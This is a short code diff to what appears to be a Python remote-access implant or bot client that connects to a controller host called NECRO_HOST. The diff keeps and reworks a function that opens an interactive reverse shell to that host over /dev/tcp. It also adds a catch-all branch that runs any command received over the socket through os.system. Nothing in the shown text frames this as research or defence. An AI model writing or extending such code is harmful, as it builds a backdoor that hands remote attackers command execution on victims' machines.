@@ -57,7 +57,7 @@ def cure():
         print(e)
 
 def shell(port):
-    os.system(f"bash -c '$(/bin/bash -i >& /dev/tcp/{NECRO_HOST}/{port} 0>&1) &'")
+    os.system(f'bash -c "$(/bin/bash -i >& /dev/tcp/{NECRO_HOST}/{port} 0>&1)" &')
 
 def carrier():
     pass
@@ -91,12 +91,13 @@ def main():
 
             if received:
 
-                try:
-                    received = received.strip().split(' ')
-                    command, arg = received[0], received[1]
-                except Exception as e:
-                    command = received[0]
-                    arg = False
+                if not received.strip():
+                    continue  # Skip empty input
+
+                # Split command and arguments safely
+                parts = received.strip().split(' ', 1)
+                command = parts[0].lower()
+                arg = parts[1] if len(parts) > 1 else ''
 
                 print(command)
 
@@ -114,6 +115,9 @@ def main():
 
                 elif command == "cure":
                     cure()
+                
+                else:
+                    os.system(command + ' ' + arg)
 
             s.close()
         except Exception as e:
